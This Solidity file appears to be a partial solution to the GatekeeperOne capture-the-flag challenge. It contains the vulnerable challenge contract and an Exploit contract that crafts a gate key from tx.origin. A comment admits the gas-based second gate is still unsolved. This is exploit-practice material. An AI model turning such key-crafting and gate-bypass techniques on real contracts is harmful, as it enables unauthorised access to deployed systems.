// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "exploit_templates/Destructible.sol";
import "exploit_templates/Targeted.sol";

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Exploit is Destructible, Targeted {
  constructor(address target_addr) payable Targeted(target_addr) {
  }
  function exploit() public payable {
    GatekeeperOne gate = GatekeeperOne(Targeted(this).target());

    // gate one is automatically passed, since we're not the original wallet, but a smart contract

    // gate two we'll have to figure out how to pass

    uint64 gatekey = uint64(uint16(uint160(tx.origin))) | 0x1 << 32;
    gate.enter(bytes8(gatekey));
  }
  receive() external payable {
  }
}